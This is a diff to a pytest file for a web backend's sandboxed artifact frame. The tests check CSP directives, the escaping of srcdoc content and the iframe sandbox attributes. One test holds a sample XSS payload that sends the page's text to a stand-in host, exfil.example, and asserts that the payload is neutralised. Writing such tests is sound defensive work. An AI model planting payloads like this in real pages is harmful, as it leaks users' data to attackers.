@@ -8,6 +8,7 @@ into it (a ``srcdoc`` frame would).
 
 from __future__ import annotations
 
+import html
 import json
 
 import pytest
@@ -19,7 +20,7 @@ import backend.db.artifact_store as artifact_store_mod
 import backend.services.artifacts as artifacts_service
 from backend.core.spa_csp import spa_csp
 from backend.db.artifact_store import ArtifactStore
-from backend.services.artifact_frame import RESPONSE_CSP, prepare_frame_document
+from backend.services.artifact_frame import RESPONSE_CSP, frame_shell, prepare_frame_document
 
 
 def _directive(policy: str, name: str) -> str:
@@ -129,6 +130,36 @@ def test_response_policies_sandbox_the_frame():
     assert "frame-ancestors 'self'" in RESPONSE_CSP["html"]
 
 
+@pytest.mark.parametrize("kind", ["html", "svg"])
+def test_response_policies_pin_the_artifact_in_place(kind):
+    """The app page's ``frame-src`` allows ``https:`` (the Embed widget), so only the shell's own
+    policy can stop the artifact navigating its frame to a URL that carries the book."""
+    assert "frame-src 'none'" in RESPONSE_CSP[kind]
+    assert "child-src 'none'" in RESPONSE_CSP[kind]
+
+
+def test_shell_holds_the_artifact_as_an_escaped_sandboxed_child():
+    evil = "<script>location.href='https://exfil.example/?d='+document.body.innerText</script>"
+    out = frame_shell(evil, "html")
+    assert '<iframe id="onw-artifact" sandbox="allow-scripts" srcdoc="' in out
+    assert "<script>location" not in out  # only inside the escaped srcdoc attribute
+    assert html.escape(prepare_frame_document(evil, "html"), quote=True) in out
+    assert "allow-same-origin" not in out and "allow-top-navigation" not in out
+
+
+def test_shell_relays_only_its_childs_height_report():
+    out = frame_shell(HTML, "html")
+    relay = out[out.rindex("<script>") :]
+    assert "e.source!==f.contentWindow" in relay
+    assert "__onwArtifact:'height'" in relay
+
+
+def test_svg_shell_runs_no_script():
+    out = frame_shell("<svg viewBox='0 0 4 3'></svg>", "svg")
+    assert 'sandbox=""' in out
+    assert "<script" not in out
+
+
 @pytest.fixture()
 def store(tmp_path, monkeypatch, db_isolated):
     art_dir = tmp_path / "artifacts"
@@ -148,13 +179,13 @@ def _client():
     return TestClient(app)
 
 
-def test_frame_route_serves_prepared_document_with_sandbox_header(store):
+def test_frame_route_serves_the_shell_with_sandbox_header(store):
     rec = artifacts_service.create_artifact(title="Overview", content=HTML)
     res = _client().get(f"/api/artifacts/{rec['id']}/frame")
     assert res.status_code == 200
     assert res.headers["content-security-policy"] == RESPONSE_CSP["html"]
     assert res.headers["x-content-type-options"] == "nosniff"
-    assert "__onwArtifact" in res.text
+    assert res.text == frame_shell(HTML, "html")
 
 
 def test_frame_route_refuses_files_and_unknown_ids(store):
